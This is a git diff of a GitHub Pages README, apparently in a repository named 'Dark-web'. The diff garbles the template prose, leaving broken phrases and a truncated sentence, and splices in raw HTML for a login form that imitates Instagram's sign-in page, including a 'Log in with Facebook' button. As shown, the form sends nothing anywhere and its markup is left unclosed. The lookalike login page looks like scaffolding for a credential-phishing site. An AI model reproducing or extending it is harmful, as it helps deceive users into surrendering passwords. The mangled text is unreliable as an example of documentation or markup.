@@ -6,7 +6,7 @@ Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://j
 
 ### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Markdown is a lightweight o-use syntax for styling your writing. It includes conventions for
 
 ```markdown
 Syntax highlighted code block
@@ -30,8 +30,70 @@ For more details see [Basic writing and formatting syntax](https://docs.github.c
 
 ### Jekyll Themes
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/DNADEGREAT/Dark-web/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Your Pages site will use the layout and 
 
-### Support or Contact
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+
+
+
+ <div class="container">
+
+  <div class="box"> 
+
+  <div class="heading"></div>
+
+   <form class="login-form">
+
+    <div class="field">
+
+     <input id="username" type="name" placeholder="Phone number, username, or email" />
+
+      <label for="username">Phone number, username, or email</label> </div>
+
+       <div class="field">
+
+        <input id="password" type="password" placeholder="password" />
+
+         <label for="password">Password</label> </div>
+
+          <button class="login-button" title="login">Log In</button>
+
+           <div class="separator">
+
+             <div class="line"></div> 
+
+            <p>OR</p> 
+
+            <div class="line"></div> 
+
+            </div>
+
+             <div class="other">
+
+              <button class="fb-login-btn" type="button">
+
+               <i class="fa fa-facebook-official fb-icon"></i>
+
+                <span class="">Log in with Facebook</span>
+
+                 </button>
+
+                  <a class="forgot-password" href="#">Forgot password?</a>
+
+                   </div>
+
+                    </form>
+
+                     </div>
+
+                      <div class="box">
+
+                       <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+
+                        </div>
+
+                         </div
+
+ 
+
+                         
